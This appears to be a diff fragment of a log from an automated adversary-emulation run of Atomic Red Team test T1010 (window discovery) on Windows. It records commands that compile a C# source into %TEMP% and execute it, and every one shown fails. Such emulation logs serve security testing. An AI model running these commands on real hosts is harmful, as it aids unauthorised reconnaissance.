+    + CategoryInfo          : InvalidOperation: (C:\atomics\T1010\src\T1010.cs:String) [Invoke-WebRequest], IOException
+    + FullyQualifiedErrorId : WebCmdletIOPendingException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:csc : The system cannot find the file specified
+At line:1 char:1
++ C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Windows\Mi...v4.0.30319\csc.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:9
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:The term '%TEMP%\T1010.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
